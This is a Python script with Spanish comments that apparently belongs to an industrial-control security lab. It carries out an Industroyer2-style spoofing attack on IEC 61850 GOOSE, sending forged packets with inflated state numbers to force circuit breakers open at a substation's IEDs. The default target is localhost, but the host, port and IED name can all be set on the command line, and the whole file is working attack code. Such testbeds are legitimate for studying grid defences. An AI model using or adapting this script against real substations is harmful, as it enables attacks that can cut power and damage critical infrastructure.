#!/usr/bin/env python3
"""attacker/attack_goose_spoofing.py — Vector de Ataque por Inyección / Spoofing GOOSE IEC 61850 (Industroyer2)

Inspirado en el ataque ciberfísico Industroyer2 (Ucrania, 2022).
Explota la ausencia de autenticación y cifrado nativo en mensajes IEC 61850 GOOSE
en el bus de proceso de la subestación eléctrica:
  - Genera PDU GOOSE malicioso con número de estado (`stNum`) incrementado.
  - Fuerza el valor `breaker_pos = False` (XCBR1 Trip / Disparo de Interruptor).
  - Emite el paquete vía UDP Multicast / Unicast hacia los IEDs de la subestación.
"""
from __future__ import annotations

import argparse
import logging
import socket
import sys
import time
from pathlib import Path
from typing import Optional, Sequence

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from plc.iec61850_emulator import (
    Iec61850GooseEncoder,
    DEFAULT_GOOSE_PORT,
    MULTICAST_GOOSE_ADDR
)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][GOOSE-SPOOF] %(message)s')
LOGGER = logging.getLogger('attack_goose_spoofing')


def spoof_goose_trip(
    target_host: str = '127.0.0.1',
    target_port: int = DEFAULT_GOOSE_PORT,
    ied_name: str = 'CITYLAB_IED1',
    st_num: int = 999,
    sq_num: int = 1,
    breaker_pos: bool = False
) -> bytes:
    """Construye y transmite un paquete GOOSE malicioso de disparo de interruptor."""
    gcb_ref = f"{ied_name}/LLN0$GO$gcb01"
    datset_ref = f"{ied_name}/LLN0$ds01"

    pdu = Iec61850GooseEncoder.encode(
        gcb_ref=gcb_ref,
        datset_ref=datset_ref,
        st_num=st_num,
        sq_num=sq_num,
        breaker_pos=breaker_pos
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(pdu, (target_host, target_port))
        LOGGER.info(
            "Paquete GOOSE falsificado enviado a %s:%d | IED: %s | stNum: %d | BreakerPos: %s (TRIP)",
            target_host, target_port, ied_name, st_num, breaker_pos
        )
    finally:
        sock.close()
    return pdu


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="CityLab IEC 61850 GOOSE Spoofing Attack (Industroyer2 Pattern)")
    parser.add_argument("--host", default="127.0.0.1", help="Host/IP objetivo del IED o red multicast (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=DEFAULT_GOOSE_PORT, help=f"Puerto UDP GOOSE (default: {DEFAULT_GOOSE_PORT})")
    parser.add_argument("--ied", default="CITYLAB_IED1", help="Nombre del IED objetivo (default: CITYLAB_IED1)")
    parser.add_argument("--stnum", type=int, default=100, help="Número de estado falsificado stNum (default: 100)")
    parser.add_argument("--burst", type=int, default=5, help="Número de ráfagas GOOSE a transmitir (default: 5)")
    args = parser.parse_args(argv)

    LOGGER.info("Iniciando vector de ataque GOOSE Spoofing contra subestación eléctrica...")
    for i in range(args.burst):
        spoof_goose_trip(
            target_host=args.host,
            target_port=args.port,
            ied_name=args.ied,
            st_num=args.stnum + i,
            sq_num=i + 1,
            breaker_pos=False
        )
        time.sleep(0.1)

    LOGGER.info("Ataque por inyección GOOSE completado exitosamente.")
    return 0


if __name__ == '__main__':
    sys.exit(main())
